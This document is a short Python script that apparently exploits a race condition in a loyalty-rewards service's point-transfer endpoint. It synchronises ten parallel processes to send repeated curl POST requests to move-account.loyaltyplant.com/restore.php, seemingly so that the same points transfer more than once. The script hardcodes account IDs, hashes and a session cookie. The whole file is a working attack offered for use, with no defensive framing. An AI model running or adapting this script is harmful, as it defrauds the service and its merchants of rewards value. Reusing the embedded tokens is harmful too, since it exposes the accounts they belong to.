import os
from threading import Thread, Semaphore
from time import sleep
from time import time
from multiprocessing import Pool


# 'to' is actually the 'from' device for unknown reason on 7leaves' end...
# FAQ: how to get these? These come from the link you recieve when you request
# to transfer points on any reward system
from_id1 = "36481202"
from_hash1 = "5c9f6868fd9618a35abed1bf66d75f59"
to_id1 = "35631537"
to_hash1 = "d1d52e5788de3c91284e554059e7c6ba"

from_id2 = "36481232"
from_hash2 = "b700581cbb45cfa37efddc2d0ec54627"
to_id2 = "35631537"
to_hash2 = "d1d52e5788de3c91284e554059e7c6ba"

def send_A(*args):
    start = args[0]
    while time() < start + 5: #syncronize the execution of each process
        pass
    cmd = "curl -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://move-account.loyaltyplant.com' --compressed -H 'Cookie: PHPSESSID=72741c696fdbc6b6b6d0dbc60aaf4f52' -H 'Connection: keep-alive' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15' -H 'Referer: https://move-account.loyaltyplant.com/restore.php?type=email&fromid=" + from_id1 + "&fromhash=" + from_hash1 + "&toid=" + to_id1 + "&tohash=" + to_hash1 + "' -H 'Accept-Language: en-US,en;q=0.9' -X POST https://move-account.loyaltyplant.com/restore.php -d 'current-id=" + to_id1 + "&previous-id=" + to_id1 + "&current-hash=" + from_hash1 + "&previous-hash=" + to_hash1 + "'"
    print(time())
    os.system(cmd)
    
def send_B(*args):
    start = args[0]
    while time() < start + 5: #syncronize the execution of each process
        pass
    cmd = "curl -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://move-account.loyaltyplant.com' --compressed -H 'Cookie: PHPSESSID=72741c696fdbc6b6b6d0dbc60aaf4f52' -H 'Connection: keep-alive' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15' -H 'Referer: https://move-account.loyaltyplant.com/restore.php?type=email&fromid=" + from_id2 + "&fromhash=" + from_hash2 + "&toid=" + to_id2 + "&tohash=" + to_hash2 + "' -H 'Accept-Language: en-US,en;q=0.9' -X POST https://move-account.loyaltyplant.com/restore.php -d 'current-id=" + to_id2 + "&previous-id=" + to_id2 + "&current-hash=" + from_hash2 + "&previous-hash=" + to_hash2 + "'"
    os.system(cmd)

if __name__ == '__main__':
    start = time()
    times_run = 10
    with Pool(times_run) as p:
        p.map(send_A, [start for _ in range(times_run)])
        p.map(send_B, [start for _ in range(times_run)])
